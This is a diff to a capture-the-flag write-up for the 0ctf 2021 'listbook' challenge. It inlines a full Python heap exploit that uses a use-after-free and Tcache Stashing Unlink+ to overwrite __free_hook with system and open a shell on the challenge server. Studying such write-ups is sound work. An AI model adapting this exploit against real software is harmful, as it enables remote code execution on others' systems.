@@ -121,8 +121,114 @@ pwndbg> x/gx $in_use
 - - -
 
 1. Use name "\x80" to trigger UAF in chunk idx 0 and 1.
-2. Since it uses libc 2.31 and the allocation size is 0x31 and 0x211 ( smallbin size ) we use [Tcache Stashing Unlink+](https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus) attack to create overlapping chunks and overwrite fd of the tcache in the list.<br>
+2. Since it uses libc 2.31 and the allocation size is 0x31 and 0x211 ( smallbin size ) we use [Tcache Stashing Unlink+](https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus) attack to create overlapping chunks and overwrite fd of the tcache in the list.<br>[](https://github.com/4n0nym4u5/CTF-Writeups/blob/main/0ctf-21-listbook/expl.py)
 
-   ![](njkrxu9-imgur.png)
+   ```python
+   #!/usr/bin/env python3.9
+   # -*- coding: utf-8 -*-
 
-   You can find the expl.py here:  <https://github.com/4n0nym4u5/CTF-Writeups/blob/main/0ctf-21-listbook/expl.py>
+   from rootkit import *
+   exe = context.binary = ELF('./listbook')
+
+   host = args.HOST or '111.186.58.249'
+   port = int(args.PORT or 20001)
+
+   gdbscript = '''
+   tbreak main
+   continue
+   '''.format(**locals())
+
+   # -- Exploit goes here --
+
+   def option(choice):
+       sla(">>", str(choice))
+
+   def add(name, content):
+       option(1)
+       sla("name>", name)
+       sla("content>", content)
+
+   def delete(idx):
+       option(2)
+       sla("index>", str(idx))
+       if b"empty" not in rl():
+           pass
+
+   def show(idx):
+       option(3)
+       sla("index>", str(idx))
+
+   def print_all():
+       for i in range(16):
+           show(i)
+
+   def delete_all():
+       for i in range(16):
+           delete(i)
+
+   io = start()
+   R = Rootkit(io)
+   libc=ELF("./libc.so.6")
+
+   add(b"\x00", b"c"*8)
+   add(b"\x01", b"d"*8)
+   add(b"\x08", b"d"*8)
+   delete(0)
+   delete(1)
+   delete(8)
+   add(b"\x80", b"A"*8)
+   show(1)
+   reu(b"=> ")
+   heap_base=uuu64(rl())-0x2d0
+   hb=heap_base
+   info(f"heap base : {hex(heap_base)}")
+   for i in range(8):
+       add(b"\x08", b"X"*8)
+   add(b"\x00", b"c"*8)
+   add(b"\x01", b"d"*8)
+   delete(8)
+   show(1)
+   reu(b"=> ")
+   reu(b"=> ")
+   libc.address=uuu64(rl())-0x1ebbe0
+   lb()
+   # Rest is all Heap Feng Shui
+   for i in range(2):
+       add(b"\x09", b"X"*0x200)
+
+   delete(8)
+   delete(1)
+
+   for i in range(10):
+       add(b"\x08", b"X"*0x200)
+   for i in range(6):
+       add(b"\x09", b"X"*0x200)
+
+   add(b"\x00", b"A")
+   add(b"\x04", b"B")
+   delete(0)
+   delete(9)
+   delete(4)
+   add(b"\x80", p(libc.sym['__free_hook'])*64)
+   delete(1) # trigger smallbin corruption overwrite fd & bk
+   fd=hb+0x1790
+
+
+   add(b"\x09", (p(fd)   +      p(hb+0x2d0)  + b"a"*0x10   )) # 0x19d0
+   add(b"\x09", (p(hb+0x2d0)  + p(hb+0x19d0) + b"b"*0x10   )) # 0x2b10
+   add(b"\x09", (p(hb+0x19d0) + p(hb+0x2b10) + b"c"*0x10   ) + p(0x0)*56 + p(0) + p(0x211) + p(libc.address+0x1ebde0)*2 ) # 0x2d50 libc.address+0x1ebde0 -> main_arena+608 to bypass check in _int_malloc+215
+   add(b"\x09", (p(hb+0x2f90) + p(hb+0x2f40) + b"d"*0x10   )) # 0x2f90
+   add(b"\x09", (p(hb+0x2d50) + p(hb+0x2f90) + p(hb+0x2f90)*2)) # 0x2c0
+   add(b"\x09", (p(hb+0x2b10) + p(hb+0x1790) + b"f"*0x10   )) # 0x1790
+
+   # use tcache stashing unlink + to create overlapping chunks
+
+   add(b"\x08", b"d"*8)
+   add(b"\x00", b"A"*8 )
+   add(b"\x00", p(0)*3 + p(0x31) + p(0)*5 + p(0x211) + p(libc.sym['__free_hook']) + p(0) ) # overwrite fd of tcache to __free_hook
+   add(b"\x02", b"/bin/sh\x00"*8)
+   add(b"\x00", p(libc.sym['system'])) # overwrite __free_hook
+   delete(2)
+
+   io.interactive()
+   ```
